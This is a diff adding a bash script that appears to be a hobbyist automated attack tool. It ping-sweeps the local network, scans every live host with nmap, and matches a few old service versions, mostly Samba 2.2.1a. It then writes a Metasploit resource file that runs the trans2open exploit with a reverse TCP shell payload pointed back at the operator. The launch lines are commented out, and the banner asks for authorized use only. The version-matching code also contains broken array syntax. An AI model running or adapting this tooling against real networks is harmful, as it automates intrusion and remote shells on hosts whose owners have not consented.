@@ -1,0 +1,165 @@
+#!/bin/bash
+
+function ftpVulns(){
+	echo "$ips is vulnerable to $ftp"
+}
+function sshVulns(){
+	echo "$ips is vulnerable to $ssh"
+
+	#gnome-terminal -e "bash -c 'msfconsole << msf > "use exploit/linux/samba/trans2open;" "set RHOSTS $ips;" "set LHOST $ip;" "set payload linux/x86/shell_reverse_tcp;" "run;" "bash"'" 2> /dev/null
+}
+function smbVulns(){
+	echo "$ips is vulnerable to $smb"
+	#echo "Exploiting $smb vulnerablility is in process"
+	#./a.exp
+cat << trans2open > exploits/smb/trans2open.rc
+use exploit/linux/samba/trans2open
+set RHOSTS $ips
+set LHOST $ip
+set payload linux/x86/shell_reverse_tcp
+run
+trans2open
+	#gnome-terminal -e "bash -c 'msfconsole -r exploits/smb/trans2open.rc; bash'" 2> /dev/null
+}
+function apacheVulns(){
+	echo "$ips is vulnerable to $apache"
+}
+cat <<_warning_
+#####################################################################################
+#This program works in Kali Linux ONLY and must be root.                            #
+#By running this program, you are agreeing on NOT running it aginst any public,     #
+#corporate or unauthorized networks.                                                #
+#Performed only when you have authorization to do.                                  #
+#This tool can be found at: https://github.com/abdulr7mann                          #
+#Plz add our HackerEnv community server on discord: https://discord.gg/sB5ruJ6      #
+#####################################################################################
+
+_warning_
+if [ -f online.txt ]
+then
+	rm online.txt
+	rm urIp.txt
+fi
+ip="$(ip a |grep 'inet ')"
+ip="$(echo $ip | cut -d' ' -f7-7)"
+echo "Performing a ping sweep is in process"
+fping -a -g $ip  2> /dev/null > online.txt
+echo $ip | cut -f1-1 -d"/" > urIp.txt
+ip="$(cat urIp.txt)"
+echo "Your ip address is $ip "
+grep -vxFf urIp.txt online.txt > tmp.txt; cat tmp.txt > online.txt; rm tmp.txt
+for ips in $(cat online.txt)
+do
+	echo "$ips is Online"
+done
+echo "########################################"
+for ips in $(cat online.txt)
+do
+	if [ -d "$ips" ]
+	then
+		rm -r $ips
+	fi
+	mkdir $ips
+	if [ -d exploits/ ]
+	then
+		rm -r exploits/
+	fi
+	mkdir -p exploits/{smb,ssh,ftp,apache}
+	echo "Performing port scan on $ips"
+	#nmap -sV -n -Pn -p- -T4 -A -O --open -oA $ips/$ips $ips 1> /dev/null 2> /dev/null
+	nmap -sV -T4 -O --open -oA $ips/$ips $ips 1> /dev/null
+	grep "open" $ips/$ips.nmap |sed '1d'
+	ftp_NameDataBase=('ftp' '')
+	ftp_VulnsDataBase=('ftp' '')
+	ftp_VersionDataBase=('' '')
+
+	ssh_NameDataBase=('ssh' '')
+	ssh_VulnsDataBase=('OpenSSH' '')
+	ssh_VersionDataBase=('2.9p2' '')
+
+	smb_NameDataBase=('netbios-ssn' '')
+	smb_VulnsDataBase=('Samba')
+	smb_VersionDataBase=('Samba 2.2.1a' '')
+
+	apache_VulnsDataBase=('Apache' 'mod_ssl/2.8.4' '')
+	apache_VersionDataBase=('' '')
+
+	name=("$(cat $ips/$ips.xml | grep -oP 'name="\K[^"]+' > $ips/name.txt)")
+	product=("$(cat $ips/$ips.xml | grep -oP 'product="\K[^"]+' > $ips/product.txt)")
+	version=("$(cat $ips/$ips.xml | grep -oP 'version="\K[^"]+' > $ips/version.txt)")
+	ostype="$(cat $ips/$ips.xml | grep -oP 'osfamily="\K[^"]+' |head -1)"
+	osgen="$(cat $ips/$ips.xml | grep -oP 'osgen="\K[^"]+' > $ips/osgen.txt)"
+	echo "OS type: $ostype $osgen"
+	for name in $(cat $ips/name.txt)
+	do
+		for product in $(cat $ips/product.txt)
+		do
+			for version in $(cat $ips/version.txt)
+			do
+				#SSH
+				for ssh in "${ssh_VulnsDataBase[@]}"
+				do
+					if [ "$name" = "${ssh_NameDataBase=[@]}" ]
+					then
+						if [ "$product" = "$ssh" ]
+						then
+							if [ "$version" = "${ssh_VersionDataBase=[@]}" ]
+							then
+								echo "name=$name AND service=$product AND version=$version sshVulns=$ssh"
+								echo "$name $product $version"
+								#sshVulns
+							fi
+						fi
+					fi
+				done
+				#FTP
+				for ftp in "${ftp_VulnsDataBase[@]}"
+				do
+					if [ "$name" = "${ftp_NameDataBase=[@]}" ]
+					then
+						if [ "$product" = "$ftp" ]
+						then
+							if [ "$version" = "${ftp_VersionDataBase=[@]}" ]
+							then
+								echo "name=$name AND service=$product AND version=$version ftpVulns=$ftp"
+								echo "$name $product $version"
+								#ftpVulns
+							fi
+						fi
+					fi
+				done
+				#smb
+				for smb in "${smb_VulnsDataBase[@]}"
+				do
+					if [ "$name" = "${smb_NameDataBase=[@]}" ]
+					then
+						if [ "$product" = "$smb" ]
+						then
+							if [ "$version" = "${smb_VersionDataBase=[@]}" ]
+							then
+								echo "name=$name AND service=$product AND version=$version smbVulns=$smb"
+								#smbVulns
+							fi
+						fi
+					fi
+				done
+				#apache
+				for apache in "${apache_VulnsDataBase[@]}"
+				do
+					if [ "$name" = "${apache_NameDataBase=[@]}" ]
+					then
+						if [ "$product" = "$apache" ]
+						then
+							if [ "$version" = "${apache_VersionDataBase=[@]}" ]
+							then
+								echo "name=$name AND service=$product AND version=$version apacheVulns=$apache"
+								#apacheVulns
+							fi
+						fi
+					fi
+				done
+			done
+		done
+	done
+	echo "########################################"
+done
